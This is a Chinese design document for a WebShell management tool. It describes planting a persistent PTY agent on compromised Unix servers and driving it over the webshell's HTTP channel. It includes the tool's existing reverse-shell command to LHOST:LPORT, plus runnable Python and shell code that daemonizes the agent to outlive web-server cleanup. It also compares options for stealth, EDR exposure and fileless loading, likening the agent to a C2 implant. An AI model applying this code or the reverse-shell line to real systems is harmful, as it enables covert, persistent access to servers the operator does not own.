# 基于 WebShell 的真 PTY 交互 Shell — 设计方案

> 状态：设计稿（**暂缓实现** — 必要性评估见 §11）
> 日期：2026-11-17
> 目标：在 WebShell 交互页新增「Full shell (PTY)」入口，不建立反弹连接、不依赖 `/dev/tcp`，通过 WebShell 自身通道获得**真 PTY**（`isatty`、resize/SIGWINCH、Ctrl-C/Q/Z、`vim`/`top`/`less` 可用）。
> 参考实现：现有 `lib/pages/reverse_shell_terminal_page.dart`（xterm 终端）、`lib/services/suo5_client_service.dart`（全双工隧道）、`lib/connectors/jsp_runtime_connector.dart`（`echo <b64> | base64 -d | bash` 传脚本）。
> 已本地验证：`python3 pty.fork` + 追加式输出文件 + 输入队列 + `TIOCSWINSZ` 原型，`isatty`/`stty size`/resize/Ctrl-C/job control/长轮询首字节返回全部通过（详见 §7.1）。

---

## 0. TL;DR

WebShell 是无状态 HTTP，一次请求只能跑一条命令并拿回 stdout，**没法**直接承载交互流。要「真 PTY」必须先解决两件事：

1. **目标端有一个常驻进程持有 PTY**（否则每条命令都是一次性 `sh -c`，没有 line discipline、没有 job control、没有 SIGWINCH）。
2. **后继请求能读写这个进程的输入输出**（因为 HTTP 无法保持连接）。

因此方案 = **目标端 PTY Agent + 三种传输档位**：

| 档位 | 语义 | 延迟 | 依赖 | 适用范围 |
| --- | --- | --- | --- | --- |
| **P1 Pull**（默认） | 轮询拉取输出，输入**捎带在同一请求**里 | RTT + ≤200 ms | 任意 `shellExec` 连接器 | 全部 Unix 目标 |
| **P2 Long-Poll Push** | 请求在目标端挂起，**有输出即返回**（服务端“推”） | RTT + ~50 ms | 同 P1 + 允许 15 s 长请求 | 全部 Unix 目标（自动探测并发） |
| **P3 Tunnel Push** | suo5/suo6 隧道承载全双工字节流 | ≈ RTT | suo payload 可上传/注入 | JSP 最佳，PHP 次之 |

三者共用同一个目标端 Agent 和同一个终端页；P1/P2 是「C2 pull/push」，P3 是「真 push」。

> **网络前提（关键）**：三档全部是「Matrix → WebShell URL」的**出站**请求，不监听端口、不接受入站连接，因此**不要求操作机有公网 IP，也不要求目标能回连**。唯一前提是 Matrix 本来就能访问这个 WebShell——与你点开现有终端敲 `ls` 是同一条链路。需要公网 IP/端口映射的是现有那枚「reverse shell」按钮（目标主动连回 `LHOST:LPORT`），不是本方案。详见 §4.0。

核心机制（与 C2 beacon 同构）：

```
输入：客户端 → base64 → `>> $D/ink` → kill -USR1 agent → agent 写 PTY master
输出：agent 读 PTY master → 追加 `$D/out` → 客户端按逻辑偏移 `tail -c +N | base64`
尺寸：客户端写 `$D/size` → kill -WINCH agent → ioctl(TIOCSWINSZ) + 自动 SIGWINCH
```

全部请求体都是 ASCII base64，因此对 PHP `eval`、`passthru`、JSP `Runtime`、Behinder/Godzilla 加密壳一律安全（不破坏二进制、不被 `.trim()`、不被 HTML 解码）。

---

## 1. 背景与约束

### 1.1 现有「完整终端（反弹 Shell）」的局限

`ReverseShellTerminalPage` + `ReverseShellService` 的做法是：让目标 `bash -c 'script -q /dev/null bash >& /dev/tcp/LHOST/LPORT'`。

问题：

- **依赖 `bash` 与 `/dev/tcp`**。Debian/Ubuntu 的 `/bin/sh` 是 dash；`/dev/tcp` 是 bash 编译期特性，部分发行版关闭；busybox 目标直接没有。
- **要求目标能出网到操作机**。NAT/出站白名单/云安全组经常不允许。
- **要求操作机有可达地址**。操作机在 NAT 后面时 `LHOST` 无法被目标访问。
- 一旦 listener 端口被防火墙或主机安全拦截，整套功能不可用。

新方案把「通道」换成已有的 WebShell HTTP 连接，只要求**客户端能访问 WebShell URL**——这正是 WebShell 已经成立的前提。

### 1.2 为什么「真 PTY」难

| 需求 | 无 PTY（pipe） | 有 PTY |
| --- | --- | --- |
| 行编辑、方向键、Tab | 无（程序看不到 tty） | 由 line discipline 处理 |
| Ctrl-C / Ctrl-Z | 只是字节 `0x03`，没人转成 SIGINT | 内核转 SIGINT/SIGTSTP 给前台进程组 |
| `vim` / `top` / `less` | 报错或降级 | 正常全屏 |
| `tput` / `stty size` | 0×0 | 正确尺寸，resize 触发 SIGWINCH |
| 密码提示回显抑制 | 做不到 | 内核处理 |

WebShell 每次请求都是 `sh -c <cmd>` 的一次性子进程，天然上面一列都拿不到。所以必须引入常驻 Agent。

另外两条常见捷径都不可行：**WebSocket** 需要 HTTP Upgrade，而 WebShell 只是一个普通 PHP/JSP 脚本，既不会升级协议，也无法在响应结束后继续写；**SSE** 是单向的，且同样要求脚本支持流式输出与长连接，与「一次性 `sh -c`」模型冲突。因此「推」只能要么服务端挂起请求（长轮询），要么另开一条全双工隧道（P3）。

### 1.3 目标与非目标

**目标**

- 一键在 WebShell 页启动真 PTY shell；终端页复用 xterm。
- 无出网、无 listener、无 `/dev/tcp` 依赖。
- 支持 resize、Ctrl-C/Z、粘贴、IME、`vim`/`top`。
- 会话可重连（页面关掉再打开仍在）；App 重启后可 attach（P1/P2）。
- 失败可解释：缺 `python3`/`script` 时明确提示，而不是假装成功。

**非目标（v1）**

- Windows（ASP/ASPX）目标。ConPTY 需要额外 C# 组件，且现有 UI 已对 `asp*` 隐藏此类入口。
- 真正的服务端流式响应（chunked 推送）：受 nginx/PHP 缓冲与连接生命周期限制，收益不如 P2/P3。
- 多用户共享一个 session（一个 session 一个操作者）。

---

## 2. 总体架构

```
┌────────────────────────── Flutter (Dart) ──────────────────────────┐
│  WebshellInteractivePage  ──[Full shell (PTY)]──►  PtyLaunchDialog │
│                                                          │         │
│                                        PtyLauncher.probe()/start() │
│                                                          ▼         │
│   PtyTerminalPage (xterm)  ◄── PtySession (状态机/历史/重连)        │
│                                      │                             │
│                    ┌─────────────────┼──────────────────┐          │
│                    ▼                 ▼                  ▼          │
│            PullTransport     LongPollTransport    TunnelTransport  │
│                    │                 │                  │          │
└────────────────────┼─────────────────┼──────────────────┼──────────┘
                     │ HTTP (connector)│                  │ suo5/suo6
                     ▼                 ▼                  ▼
┌────────────────────────── 目标端 (Unix) ───────────────────────────┐
│  WebShell 脚本（既有 payload，不改）                                │
│        │ sh -c                                                      │
│        ▼                                                            │
│  $D/ink ──► PTY Agent (python3/script) ──► pty master ──► $SHELL -i │
│  $D/size ──►   ioctl(TIOCSWINSZ)          ▲                         │
│  $D/out  ◄──   read(master)               └── 子进程前台进程组       │
│  $D/ctl / $D/pid / $D/base / $D/gen                                │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.1 一次会话的时序（P1 Pull）

```
Client                                   Target
  │ ① probe: 批量探测 python3/script/tmp/base64/timeout/...
  │──────────── POST cmd=probe ───────────►│  sh -c probe（一次请求）
  │◄─────────── key=value 列表 ────────────│
  │ ② bootstrap: mkdir $D; echo <b64>|base64 -d>$D/a; setsid python3 $D/a $D
  │──────────── POST cmd=bootstrap ───────►│  派生 Agent（脱离会话）
  │◄──────────────── OK ───────────────────│
  │ ③ 主循环：捎带输入的读（无输入时就是纯读）│
  │── POST sendAndRead(off, b64 输入?) ────►│  ① base64 -d >> $D/ink + kill -USR1
  │                                         │  ② 等 ≤50 ms 让回显进入 out（仅当有输入）
  │                                         │  ③ tail -c +N $D/out | base64
  │◄──── gen base drop ink;b64 ────────────│
  │ ④ 解码 → xterm；offset += len            │  Agent: ink → pty master
  │   len == LIM 则立刻再发（drain）         │  pty 输出 → out
  └─────────────────────────────────────────┘
```

一次交互 = **一次 HTTP 往返**（输入与输出合并在同一请求），空闲时按调度退避，有输出时立即续拉（drain 模式）。

---

## 3. 目标端 Agent

### 3.1 能力探测（一次请求完成）

把探测压成一条命令，减少往返：

```sh
for t in python3 python script socat stty timeout base64 openssl setsid flock; do
  p=$(command -v "$t" 2>/dev/null) && echo "tool.$t=$p"
done
echo "os=$(uname -s)"; echo "uid=$(id -u)"; echo "sh=$SHELL"
echo "tmp=${TMPDIR:-/tmp}"; echo "home=$HOME"
echo "writable=$([ -w "${TMPDIR:-/tmp}" ] && echo 1 || echo 0)"
python3 -c 'import sys;print("py=%d.%d"%sys.version_info[:2])' 2>/dev/null || true
```

客户端据此选 Agent 载体。**真正的约束不是「必须有 Python」，而是「必须有一个进程能 `forkpty` / 打开 `/dev/ptmx`」**——`sh` 本身做不到，所以需要一个载体：

| 载体 | 真 PTY | resize | 背压 | 依赖 | 备注 |
| --- | --- | --- | --- | --- | --- |
| **python3 / python2** | ✅ | ✅ `ioctl(TIOCSWINSZ)` | ✅ | 解释器 | 能力最全，首选 |
| **C helper（随包投递）** | ✅ | ✅ | ✅ | 仅 libc | 需按 arch/libc 预编译；20–50 KB；EDR 更敏感 |
| **`script`**（util-linux / BSD / busybox） | ✅ | ⚠️ 需 `/proc` + `stty -F` | ❌ | coreutils | 覆盖率最高，作为 B 档 |
| **`tmux`** | ✅ | ✅ `resize-window` | ⚠️ | tmux | `pipe-pane` 取流、`send-keys` 输入；不一定装 |
| **`socat`** | ✅ | ❌ | ❌ | socat | `socat - EXEC:bash,pty,raw,echo=0` 可替代 `script` |
| **`perl` + `IO::Pty`** | ✅ | ✅ | ✅ | 模块常缺 | 只作最后兜底 |
| **只有 `sh`** | ❌ | — | — | — | C 档：明确不支持，不假装 |

**覆盖率要实测，不要按发行版猜**（探测已经在 §3.1 第一段做了）：

- Ubuntu 20.04+ / Debian 11+：`python3` 基本随 apt 存在；
- RHEL/CentOS 8/9：可能只有 `/usr/libexec/platform-python`（`python3` 不在 PATH），探测时额外试这个路径；
- Alpine / 常见容器镜像（`nginx:alpine`、`php:*-fpm`）：通常没有 `python3`；busybox 多数构建带 `script`，需 `busybox --list | grep -x script` 实测；
- 绝大多数 Linux：util-linux 必备 → `script` 可用；macOS 是 BSD `script`（参数不同，另写变体）。

**B 档（`script`）如何拿到 resize**：

```sh
# script 的子 shell 才是 pty slave 的持有者
CH=$(cat "/proc/$(cat "$D/pid")/task/$(cat "$D/pid")/children" 2>/dev/null | awk '{print $1}')
SLAVE=$(readlink "/proc/$CH/fd/0")          # /dev/pts/N
stty -F "$SLAVE" cols "$2" rows "$3"        # 内核同时向该 tty 的前台进程组发 SIGWINCH
```

`/proc` 不可见（隐藏 pid、容器关 procfs）时禁用 resize 并在 UI 标注，**不回退到「往 stdin 里塞 `stty` 命令」**（那会打进正在运行的 `vim` 画面）。

**实现上只暴露一个枚举**，Dart 侧不关心具体载体：

```dart
enum PtyAgentKind { python, native, script, none }
```

三种实现共用 §3.2 的文件协议与 §4 的传输层，能力差异用能力位表示（`canResize`、`canBackpressure`、`supportsTunnel`），UI 据此屏蔽或标注。

选择顺序：`python` → `native`（随包提供且架构匹配时）→ `script`/`socat` → 明确拒绝。**不要默认依赖 Python**：容器镜像里没有解释器是常态，`script` 才是覆盖率兜底。

### 3.2 会话目录与文件协议

```
$D = ${TMPDIR:-/tmp}/.mxp-<sid>          # sid: 16 位小写 hex，umask 077，chmod 700
├── a          # Agent 脚本（A 档）或 launcher（B 档）
├── pid        # Agent pid（= 进程组 id，Agent 自己 setsid）
├── ctl        # "pid sid shell\n"；结束时写 "exit\n"
├── out        # 追加式输出（原始字节，不转义、不加头）
├── ink        # 追加式输入（原始字节；客户端 base64 -d >>）
├── inpos      # Agent 已消费的 ink 偏移（崩溃重启不重复执行）
├── ack        # 客户端已确认读取的逻辑偏移
├── base       # out[0] 对应的逻辑流偏移（压实后 > 0）
├── gen        # 压实代数；变化即表示偏移体系已重置
├── dropped    # 因积压被丢弃的字节数（UX 提示用）
├── size       # "COLS ROWS"
├── hb         # Agent 心跳（每 30 s 更新 mtime）→ 客户端判断「假活」
├── ka         # 客户端 keepalive（每次请求 touch）→ Agent 判断「被遗弃」
└── exit       # 子 shell 退出码
```

**为什么用「追加文件」而不是 FIFO**：FIFO 写会阻塞（Agent 已死则请求挂死）、无法做偏移、无法重连回放。追加文件 + 偏移是「可重放、可重连、崩溃安全」的最小实现。

### 3.3 输入通道

```sh
D="$1"
printf '%s' "$2" | base64 -d >> "$D/ink" &&
  kill -USR1 "$(cat "$D/pid" 2>/dev/null)" 2>/dev/null
echo OK
```

- `>>` 是 `O_APPEND`，单次写入 ≤ 4 KB 时内核保证原子；客户端**串行化**输入请求（单飞队列），并对同一 session 加 `flock`（有则用）。
- Agent 自己记录 `inpos`，只读新增部分；因此**不会重复执行历史输入**（这是崩溃/重启安全的关键）。
- `kill -USR1` 只是「尽快处理」，Agent 也有 50 ms 轮询兜底，信号丢失不影响正确性。
- 输入必须**逐字节透传**，客户端不做任何本地回显——回显由目标 PTY 负责。

### 3.4 输出通道与逻辑偏移

读命令（一次请求把「头 + 数据」一起带回）：

```sh
D="$1"; OFF="$2"; LIM="${3:-262144}"
GEN=$(cat "$D/gen" 2>/dev/null);  GEN=${GEN:-0}
BASE=$(cat "$D/base" 2>/dev/null); BASE=${BASE:-0}
DROP=$(cat "$D/dropped" 2>/dev/null); DROP=${DROP:-0}
[ "$OFF" -lt "$BASE" ] && OFF="$BASE"        # 被压实掉的部分直接跳过
printf '%s %s %s;' "$GEN" "$BASE" "$DROP"
tail -c +$((OFF - BASE + 1)) "$D/out" 2>/dev/null |
  head -c "$LIM" | base64 | tr -d '\r\n'
echo "$OFF" > "$D/ack"                       # 本次请求的起始偏移（无 stdout）
```

`ack` = 本次请求的**起始**偏移，语义是「这之前的字节客户端已确认消费」，因此 Agent 只会压实到 `ack` 之前，永远不会丢掉正在返回的那一段。写入放在最后且无 stdout，不会污染响应。

客户端解析 `GEN BASE DROP;<b64>`：

- `newOffset = BASE + decodedLen`
- `GEN` 变化 → 偏移体系重置，从新的 `BASE` 继续（可能提示「早期输出已被回收」）
- `DROP > 0` → 状态栏提示丢弃量
- `decodedLen == LIM` → 还有积压，**立刻**续拉（无 sleep）

**回收（compaction）**：Agent 在 `ack - base > 4 MB` 时把 `out` 前段丢弃（重写 `out` 尾部到临时文件后 `rename`），随后 `base += n`、`gen += 1`。写 `gen` 放在 `rename` 之后，读取方看到新 `gen` 才知道偏移已变。竞态窗口内最多一次读到「空/旧 gen」，下一次自动纠正，不会串字节。

**容量**：`out` 超过 8 MB 且客户端落后时，Agent 暂停读 PTY master（内核 pty 缓冲填满 → 子进程写阻塞，形成天然背压），同时累加 `dropped`。这比让磁盘被 `yes` 灌爆安全。

### 3.5 resize

```sh
D="$1"; echo "$2 $3" > "$D/size"; kill -WINCH "$(cat "$D/pid")" 2>/dev/null; echo OK
```

Agent 收到 `SIGWINCH` → 读 `size` → `fcntl.ioctl(fd, TIOCSWINSZ, struct.pack("HHHH", rows, cols, 0, 0))`。内核自动给前台进程组发 `SIGWINCH`，`vim`/`top` 立即重绘。**这是真 PTY 与 `stty cols` 文本注入的本质区别**（不再需要往输入流里塞 `stty` 命令，也就不会污染 `vim` 画面）。

B 档（`script`）没有 Agent 控制 master，退化为：

```sh
P=$(cat "$D/pid"); SLAVE=$(readlink "/proc/$P/fd/0")   # /dev/pts/N
stty -F "$SLAVE" cols "$2" rows "$3"                   # 内核同时发 SIGWINCH
```

`/proc` 不可见或 `stty -F` 不支持时，禁用 resize 并在 UI 标注（不回退到「往 stdin 打字」的脏做法）。

### 3.6 生命周期

| 事件 | 行为 |
| --- | --- |
| 启动 | `setsid` 脱离会话；stdin/out/err 全重定向；`umask 077`；写 `ctl`/`pid` |
| 空闲 | `ka`（客户端 keepalive）超过 `IDLE`（默认 900 s）未更新 → 自杀并清理 `$D`（防遗留 shell） |
| 子 shell 退出 | Agent 写 `ctl=exit`，退出码进 `$D/exit`，客户端读到 `gen` 不变但 `ctl=exit` → 显示「Session ended」 |
| 显式停止 | `kill -TERM -$PID`（进程组）→ 0.2 s 后 `kill -9` → `rm -rf $D` |
| App 异常退出 | 目标端 `IDLE` 兜底；下次启动时可扫描 `.mxp-*` 目录清理 `mtime > 24h` 的残留 |

### 3.7 A 档 Agent 骨架（约 120 行 Python 3，无第三方依赖）

```python
import os, sys, pty, select, signal, termios, fcntl, struct, time

D = os.path.abspath(sys.argv[1])
SH = os.environ.get("SHELL") or "/bin/bash"
OUT, INK, SIZE, CTL, POS = (os.path.join(D, n) for n in ("out", "ink", "size", "ctl", "inpos"))
CAP, IDLE = 8 << 20, 900
flag = {"winch": False, "usr1": False, "term": False}

def on_sig(sig, _):
    if sig == signal.SIGWINCH:
        flag["winch"] = True
    elif sig == signal.SIGUSR1:
        flag["usr1"] = True
    else:
        flag["term"] = True

for s in (signal.SIGWINCH, signal.SIGUSR1, signal.SIGTERM, signal.SIGINT):
    signal.signal(s, on_sig)

pid, fd = pty.fork()                       # 子进程成为 session leader + 控制终端
if pid == 0:
    os.environ.update(TERM="xterm-256color", COLORTERM="truecolor")
    os.execvpe(SH, [SH, "-i"], os.environ)

fcntl.fcntl(fd, fcntl.F_SETFL, os.O_NONBLOCK)

def setsize():
    try:
        c, r = (int(x) for x in open(SIZE).read().split()[:2])
    except Exception:
        return
    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", r, c, 0, 0))

setsize()
open(CTL, "w").write("%d %d %s\n" % (pid, os.getsid(0), SH))
inpos = int(open(POS).read().strip() or 0) if os.path.exists(POS) else 0

while True:
    r, _, _ = select.select([fd], [], [], 0.05)
    if flag["winch"]: flag["winch"] = False; setsize()
    if flag["term"]:  break
    # 每轮都检查输入（50 ms 粒度）；SIGUSR1 只是把延迟压到最低
    sz = os.path.getsize(INK) if os.path.exists(INK) else 0
    if sz > inpos:
        with open(INK, "rb") as f:
            f.seek(inpos); data = f.read(sz - inpos)
        inpos = sz
        while data:
            data = data[os.write(fd, data):]         # os.write 返回写入字节数
        open(POS, "w").write(str(inpos))
    if r:
        data = os.read(fd, 65536)
        if not data: break
        while os.path.getsize(OUT) > CAP: time.sleep(0.05)   # 背压
        with open(OUT, "ab") as f:
            f.write(data); f.flush()
```

> 正式实现还需：`SIGCHLD`/`waitpid` 收尸并写 exit code、`inpos` 持久化、`ack`/`base`/`gen` 压实、`IDLE` 计时、`--tunnel` 模式（§4.3）。
> 该骨架的核心逻辑已在 macOS 本地实测（§7.1）。

### 3.8 B 档 launcher（`script`，无 Python）

B 档没有解释器可用，所以「喂输入」必须靠一个常驻 feeder。用 20 行 launcher 把三件事固定下来：启动 `script`、记录它自己的 pid（resize 要按它找子 shell）、把 `ink` 的增长灌进 `script` 的 stdin。

```sh
#!/bin/sh
# $D/b.sh —— 由 bootstrap 投递后以前台进程拉起，自身再 daemon 化
SHELL_BIN="${1:-/bin/sh}"
: > "$D/out"
mkfifo -m 600 "$D/in" 2>/dev/null || :
script -q -f -c "$SHELL_BIN -i" "$D/out" < "$D/in" >/dev/null 2>&1 &
echo "$!" > "$D/spid"                 # script 的 pid，供 §3.1 的 /proc 查 slave
tail -f -c +1 "$D/ink" > "$D/in" 2>/dev/null &
echo "$!" > "$D/tpid"
wait
```

启动：

```sh
setsid sh "$D/b.sh" "$SHELL" </dev/null >/dev/null 2>&1 &
```

要点与限制：

- `mkfifo` 必须先于 `script` 打开读端，否则写端会阻塞；
- `tail -f -c +1` 从文件头开始跟，`script` 退出时管道断裂，`tail` 自行退出，不需要额外清理；
- 没有背压：`yes` 之类会把 `out` 撑大，只能靠 `IDLE` 和目录清理兜底（文档化，不修）；
- 没有压实：`base` 恒为 0，`gen` 恒为 0，客户端偏移永不跳变；
- resize 走 §3.1 的 `/proc/<pid>/task/<pid>/children` + `stty -F`；拿不到就禁用；
- `script` 的 `-q` 抑制 typescript 头尾元数据；BSD/macOS 的 `script` 参数不同，另写变体。

### 3.9 保证 PTY 持续运行（守护化）

PTY 的寿命 = **master fd 的持有者（Agent）活着** **且** **slave 的持有者（子 shell）没退出**。两者任一方消失，另一侧立刻收到 EOF/SIGHUP。所以「PTY 持续运行」等价于「Agent 真正脱离 Web 请求的生命周期」。

#### 3.9.1 默认会死的四种方式

| # | 失败方式 | 后果 |
| --- | --- | --- |
| 1 | 后台进程继承了 `shell_exec` 的 stdout 管道 | `shell_exec` 等 EOF 不收尾 → **HTTP 请求挂死**，直到超时；用户以为失败，其实 Agent 已在跑 |
| 2 | Agent 留在 Web 服务器的进程组/会话里 | 服务器对进程组发 `SIGTERM`（超时、优雅重启、CGI 收尾）时被一起带走 |
| 3 | 收到 `SIGHUP` | 会话首进程退出时内核向前台进程组发 HUP；无控制终端时一般不会，但 CGI/包装脚本场景会 |
| 4 | 继承了多余的 fd / 当前目录 | 持有 webroot 的 cwd 或 socket，导致目录无法删除、连接无法释放 |

#### 3.9.2 守护化五件套（Agent 自己完成，不依赖 `setsid` 二进制）

```python
# ① 双重 fork：脱离请求进程树，reparent 到 init（PID 1），不产生僵尸
if os.fork() > 0:
    os._exit(0)
os.setsid()                       # 新会话 + 新进程组 + 无控制终端
if os.fork() > 0:                 # 二次 fork：确保永远不是会话首进程，拿不到控制终端
    os._exit(0)

# ② 收尾环境
os.umask(0o077)
os.chdir("/")                     # 不持有 webroot 的 cwd
signal.signal(signal.SIGHUP, signal.SIG_IGN)
signal.signal(signal.SIGPIPE, signal.SIG_IGN)

# ③ 断开所有继承 fd（含 web 服务器的 stdout 管道），再把 0/1/2 指向 /dev/null
os.closerange(3, 1024)
null = os.open(os.devnull, os.O_RDWR)
for fd in (0, 1, 2):
    os.dup2(null, fd)

# ④ 由自己写 pid（此时 $! 已失效：父进程早就退出并被 init 收养）
open(os.path.join(D, "pid"), "w").write(str(os.getpid()))
open(os.path.join(D, "ctl"), "w").write("%d %d %s\n" % (os.getpid(), os.getsid(0), SH))
```

启动命令因此只要「拉起后立刻返回」，pid 靠轮询 `$D/pid` 获得：

```sh
umask 077; mkdir -p "$D" || exit 3
echo '<b64>' | base64 -d > "$D/a" || exit 4
python3 "$D/a" "$D" </dev/null >/dev/null 2>&1 &
echo BOOTSTRAPPED           # 不等 Agent：它已自我 daemon 化
```

> 第 1 条失败方式最常见：只要漏掉 `>/dev/null 2>&1`，`shell_exec` 就会一直等到 Agent 退出才返回，表现为「点了没反应 / 请求超时」。排查时先看目标 `ps` 里有没有 Agent。

#### 3.9.3 五件套之外的加固

- **PTY 子进程**同样不该继承 Agent 的 fd：`pty.fork` 的子侧先 `os.closerange(3, 1024)` 再 `execvpe`。
- Agent 主循环外层 `try/except BaseException` 兜底，异常时写 `ctl=exit` 而不是留个半死进程。
- master fd 设为非阻塞 + `select`，避免某次 `read` 卡死整个 Agent。
- 子 shell 退出时 `os.waitpid(pid, 0)` 取退出码 → 写 `$D/exit`，并 `killpg(pid, SIGTERM)` 清理它拉起的残留进程。
- `renice 10`（有权限时）降低与业务进程抢 CPU、被 OOM 选中的概率。

#### 3.9.4 能杀死它的东西（诚实边界）

| 事件 | 会杀 Agent 吗 | 说明 |
| --- | --- | --- |
| 发起请求的 `sh -c` 退出 | 否 | double-fork 后已 reparent 到 init |
| PHP-FPM worker 被 `request_terminate_timeout` 杀 | 否 | 只杀 worker 本身，不杀进程组；Agent 在独立会话 |
| `set_time_limit` / `max_execution_time` | 否 | 只作用于 PHP 脚本自身 |
| Apache / nginx graceful restart | 否 | 只回收 worker |
| `kill -TERM -<web 服务进程组>` | 否 | 独立 session / pgroup |
| **`systemctl restart php-fpm` / `stop`（默认 `KillMode=control-group`）** | **是** | 按 cgroup 灭族，用户态无法逃逸（`setsid` 不换 cgroup） |
| 容器 stop / 主机重启 | 是 | — |
| OOM killer | 可能 | 常驻约 8–15 MB；`renice` 只能降低概率 |
| `/tmp` 被 tmpfiles 清理 | 间接 | 开着 fd 的 Agent 还能跑，但读 `out` 的请求会失败 → 自检发现目录消失即退出 |
| 用户 `exit` / shell 崩溃 | 子 shell 死 → Agent 读到 EOF | 正常结束，写退出码 |
| 主动 `stop` / 空闲 TTL 到期 | 是（设计使然） | 防遗留 shell |

结论：**不能 100% 保证**。目标维护、容器重建、OOM 都可能带走它；能做的是「把非必要的死法全部排除 + 死了能秒级发现 + 重建时屏幕不丢」。

#### 3.9.5 存活检测与自愈

- **活着**：`kill -0 $(cat $D/pid)`。
- **没卡死**：Agent 每 30 s touch `hb`；`hb` 超过 90 s 未更新视为「假活」（被 SIGSTOP、pty 侧死锁等），客户端提示重建。
- **被遗弃**：客户端每次请求 touch `ka`；Agent 发现 `ka` 超过 `IDLE`（默认 900 s）未更新即自杀并清理目录——即使此时有程序仍在往 PTY 输出，也不续命（避免客户端消失后留下话痨孤儿）。
- **重建**：新 `$D`、新 Agent、新 shell。屏幕内容由客户端 `PtySession` 的 512 KB 历史环形缓冲回放，用户看到的是「同一块屏 + 新 shell」，而不是白屏。
- **自愈不要做「自动重启 Agent」**：Agent 一死，PTY 与 shell 都已消失，重启得到的是另一个 shell，伪装成「还在」只会误导用户。正确做法是明确报 LOST。

#### 3.9.6 空闲 TTL 的两难

- 太短：用户去开个会回来，会话没了。
- 太长：目标上留一个无人认领的交互式 shell，属于严重遗留风险。
- 判定依据是 `ka`（客户端活跃度），不是「有没有输出」：`yes` 这类程序会一直产出，用输出判活会永远不回收。
- 默认 900 s，UI 可调；退出时必删目录。

### 3.10 自包含度阶梯（「不依赖外部组件」到底能做到哪）

真 PTY 必须有人调用 `forkpty`/`openpty` 并持有 master fd——这是内核接口，不是实现选择。因此「零投递 + 零依赖 + 真 PTY」在数学上不成立。能力上限由「愿意投递什么」决定：

| 级别 | 做法 | 真 PTY | 目标端依赖 | 投递物 | 隐蔽性 |
| --- | --- | --- | --- | --- | --- |
| **L0** | 现有 integrated terminal：每条命令一次 `sh -c` | ❌ | `sh` | 无 | 最好（无落地） |
| **L1** | 投递脚本 + 目标自带解释器 | ✅ | `python3` / `script` / `socat` 之一 | 几 KB 文本 | 中（`ps` 可见解释器） |
| **L2** | 投递自包含原生 helper | ✅ | **仅内核 ABI** | 20–40 KB 静态 ELF | 中下（落一个 ELF） |
| **L3** | 内存加载，不落盘 | 理论可行，实务不可行 | 需要已有 native 执行原语 | 无 | 最好 |

**L2 才是「C2 级自包含」**：一个静态链接的小二进制，自己 `forkpty`、自己管理文件协议、自己 daemon 化，不依赖任何解释器或工具。此时它与 C2 implant 的自包含程度完全相同，差别只剩传输层：

| 维度 | 典型 C2 implant | 本方案 L2 |
| --- | --- | --- |
| 目标端依赖 | libc（或纯 syscall） | libc（或纯 syscall） |
| 投递体积 | 数百 KB – 数 MB | 20–40 KB |
| 传输 | 主动回连 listener，需要出网/落地域名 | 复用已有 WebShell 的 HTTP 请求，**零新增网络路径** |
| 失败回退 | 无 | 可退回 L1 / L0 |
| 落地痕迹 | 一个 implant | 一个 ELF + 一个临时目录 |

**L3 为什么不成立**：无文件原生执行需要 `memfd_create` + `fexecve`（或等价的 loader）。PHP 没有 `ioctl`/`fcntl` 暴露，JSP 的 JVM 无法分配 PTY 也没有直接的系统调用接口；要从 PHP/JSP 走到 `memfd_create`，中间仍然需要一个原生进程——而它要么是解释器（L1），要么是落盘的二进制（L2）。所以 L3 只在「目标本身已有内存加载原语」时才有意义，不作为通用路径。

**决策**：L1 作为默认（迭代快、投递小、覆盖面够），L2 作为「要自包含时的开关」，L0 作为零投递兜底并明确告知没有 PTY。不实现 L3。

---

## 4. 传输层三档

### 4.0 网络前提（先澄清一个常见误解）

本方案的三档都**不需要公网 IP**，也不需要端口映射、防火墙放行、FRP 之类的东西：

```
Matrix（可在 NAT 后 / 无公网入口）  ──HTTP POST──►  WebShell URL（目标）
        ▲                                              │
        └────────── 同一条已成立的出站链路 ◄───────────┘
```

- **谁是客户端**：始终是 Matrix。请求由我们发起，目标只是被动响应。
- **目标端**：Agent 只监听 `127.0.0.1`（仅 P3），从不主动外连；P1/P2 连监听都没有。
- **操作机**：不 `bind` 任何端口，不需要可达地址。

对比现有功能：

| 能力 | 连接由谁发起 | 需要公网 IP / 端口映射 | 目标需能出网 |
| --- | --- | --- | --- |
| 现有 integrated terminal | Matrix → WebShell | 否 | 否 |
| **现有「Full terminal（反弹）」** | **目标 → 操作机 `LHOST:LPORT`** | **是** | **是** |
| 本方案 P1 Pull | Matrix → WebShell | 否 | 否 |
| 本方案 P2 Long-Poll | Matrix → WebShell（请求挂起 ≤15 s） | 否 | 否 |
| 本方案 P3 Tunnel | Matrix → WebShell（suo 隧道） | 否 | 否 |

也就是说：**能打开这个 WebShell 的页面，就能用这三档**。反过来说，如果 WebShell 本身只能通过某个跳板/隧道访问，本方案自动复用那条路径——它不引入任何新的网络要求。

> 术语说明：C2 语境里的 "pull" 指「被控端不主动外连，操作端按需来取」。本方案的 pull 是 Matrix 拉取**目标端文件缓冲**，不是目标来拉任务。

### 4.1 P1 Pull（默认，C2 式轮询）

#### 4.1.1 定位

P1 是基线档：只要连接器有 `shellExec`、目标能跑 Agent，就一定可用。

| 优点 | 说明 |
| --- | --- |
| 零新增网络要求 | 全是「Matrix → WebShell」短请求，无监听、无长连接、无入站 |
| 不触碰长请求限制 | 单个请求通常 < 500 ms，不会撞上 `proxy_read_timeout` / `request_terminate_timeout` |
| 对请求串行化免疫 | 即使目标被 PHP session 锁串行，短请求排队也只有几十毫秒 |
| 读可幂等重试 | 按偏移取数，重试安全（§4.1.6） |
| 可观测 | 每个 HTTP 请求都能在本地日志/目标 access log 里对上，排障直观 |

代价：请求数多（活跃 ~16 req/s，空闲 0.5 req/s），首字延迟比 P2/P3 高一档。

#### 4.1.2 请求契约

主循环只有一种请求：**「捎带输入的读」**（无输入时退化为纯读）。

```sh
D="$1"; OFF="$2"; IN="$3"; LIM="${4:-262144}"

# ① 有输入：先落盘，再唤醒 Agent
if [ -n "$IN" ]; then
  printf '%s' "$IN" | base64 -d >> "$D/ink"
  kill -USR1 "$(cat "$D/pid" 2>/dev/null)" 2>/dev/null
  # ② 等回显（≤50 ms）：让「按键 → 显示」只花一次往返
  i=0
  while [ "$i" -lt 5 ]; do
    B=$(cat "$D/base" 2>/dev/null); B=${B:-0}
    S=$(wc -c < "$D/out" 2>/dev/null || echo 0)
    [ $((B + S)) -gt "$OFF" ] && break
